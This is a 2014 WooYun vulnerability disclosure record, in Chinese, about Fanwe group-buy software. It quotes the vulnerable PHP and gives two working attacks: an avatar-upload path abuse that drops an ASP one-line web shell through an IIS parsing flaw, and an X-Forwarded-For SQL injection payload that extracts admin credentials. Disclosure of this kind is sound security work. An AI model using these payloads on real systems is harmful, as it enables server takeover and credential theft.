{"id": 56453, "wybug_id": "wooyun-2014-057668", "wybug_title": "方维团购getshell和注射", "wybug_corp": "fanwe.com", "wybug_author": "Noxxx", "wybug_date": "2014-04-19 10:55", "wybug_open_date": "2014-06-03 10:55", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-04-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-04-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-05-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-06-03：\t细节向公众公开  简要描述： 。。。 详细说明：  save_avatar.php:\n$_REQUEST['m']=\"UcModify\";\t$_REQUEST['a']=\"save_avatar\";\tinclude ROOT_PATH.\"app/source/index.php\"; //进去看看\napp/source/index.php:\n....沈略.......\t$ma = strtolower($_REQUEST['m'].'_'.$_REQUEST['a']);\tswitch($ma){\tcase 'ucmodify_save_avatar':\trequire ROOT_PATH.'app/source/func/com_user_center_func.php';\trequire ROOT_PATH.\"app/source/user_center.php\"; //关键代码\tbreak;     ....沈略.......\napp/source/user_center.php:\nuser_enter_init (); //会员菜单初始化$userid = intval ( $_SESSION ['user_id'] );$ma = $_REQUEST ['m'] . \"_\" . strtolower ( $_REQUEST ['a'] );$ma ( $userid );exit ();function UcModify_save_avatar($userid){\t@header(\"Expires: 0\");\t@header(\"Cache-Control: private, post-check=0, pre-check=0, max-age=0\", FALSE);\t@header(\"Pragma: no-cache\");\t//这里传过来会有两种类型，一先一后, big和small, 保存成功后返回一个json字串，客户端会再次post下一个.\t$type = isset($_GET['type'])?trim($_GET['type']):'small';//这里type我们可以控制\t$pic_id = $userid;\t//$orgin_pic_path = $_GET['photoServer']; //原始图片地址，备用.\t//$from = $_GET['from']; //原始图片地址，备用.\tif (! is_dir ( ROOT_PATH . 'Public/upload/avatar/avatar_'.$type ))//创建目录 利用iis6解析漏洞 可以执行代码\t\tmkdir ( ROOT_PATH . 'Public/upload/avatar/avatar_'.$type);\t//生成图片存放路径\t$new_avatar_path = 'avatar_'.$type.'/'.$pic_id.'.jpg';\t//将POST过来的二进制数据直接写入图片文件.\t@file_put_contents(ROOT_PATH.'Public/upload/avatar/'.$new_avatar_path,file_get_contents(\"php://input\"));\t//原始图片比较大，压缩一下. 效果还是很明显的, 使用80%的压缩率肉眼基本没有什么区别\t//小图片 不压缩约6K, 压缩后 2K, 大图片约 50K, 压缩后 10K\t$avtar_img = imagecreatefromjpeg(ROOT_PATH.'Public/upload/avatar/'.$new_avatar_path);\timagejpeg($avtar_img,ROOT_PATH.'Public/upload/avatar/'.$new_avatar_path,80);\t//nix系统下有必要时可以使用 chmod($filename,$permissions);\t//输出新保存的图片位置, 测试时注意改一下域名路径, 后面的statusText是成功提示信息.\t//status 为1 是成功上传，否则为失败.\t$d = new pic_data();\t//$d->data->urls[0] = 'http://sns.com/avatar_test/'.$new_avatar_path;\t$d->data->urls[0] = '/Public/upload/avatar/'.$new_avatar_path;\t$d->status = 1;\t$d->statusText = a_L('UPLOAD_SUCCESS');\t$msg = json_encode($d);\t\techo $msg;}\n登陆状态  保存头像 自定义目录 用iis解析漏洞 执行恶意代码www.xx.cm/save_avatar.php?type=1.asppost提交数据<%execute(request(\"xiaoma\"))%>\n\n------------------------------------------------------------还有个就是 或者X-Forwarded-For导致的注射先看下getIP函数咋写的\nfunction getIP() {\tstatic $realip;    if (isset($_SERVER)){        if (isset($_SERVER[\"HTTP_X_FORWARDED_FOR\"])){ //我们可以直接伪造的            $realip = $_SERVER[\"HTTP_X_FORWARDED_FOR\"];        } else if (isset($_SERVER[\"HTTP_CLIENT_IP\"])) {            $realip = $_SERVER[\"HTTP_CLIENT_IP\"];        } else {            $realip = $_SERVER[\"REMOTE_ADDR\"];        }    } else {        if (getenv(\"HTTP_X_FORWARDED_FOR\")){            $realip = getenv(\"HTTP_X_FORWARDED_FOR\");        } else if (getenv(\"HTTP_CLIENT_IP\")) {            $realip = getenv(\"HTTP_CLIENT_IP\");        } else {            $realip = getenv(\"REMOTE_ADDR\");        }    }    return $realip;}\n我们再看谁使用了这个getIP函数app/source/user_init.php这个是程序开始就加载了的文件\n$client_ip = $iplocation->getIP();$_SESSION['CLIENT_IP'] = $client_ip; //把获取到的ip存入session中\n在登录中又 使用了这个变量导致注射app/source/index.php\n$sql_str = 'update ' . DB_PREFIX . 'user set last_ip = \\'' . $_SESSION ['CLIENT_IP'] . '\\',active_sn = \\'\\',group_id= ' . intval ( $userinfo ['group_id'] ) . ' where id = ' . intval ( $userinfo ['id'] );\n\n\nexp:127.0.0.13'AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT SUBSTRING(CONCAT(adm_name,0x7c,adm_pwd,0x7c),1,60)  FROM fanwe_admin LIMIT 0,1),FLOOR(RAND(0)*2))X FROM information_schema.tables GROUP BY X)a),active_sn = '   漏洞证明：  \n\n   修复方案：  过滤   版权声明：转载请注明来源 Noxxx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-04-19 11:27 厂商回复： 感谢你们发现漏洞，我们已经第一时间修复了 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}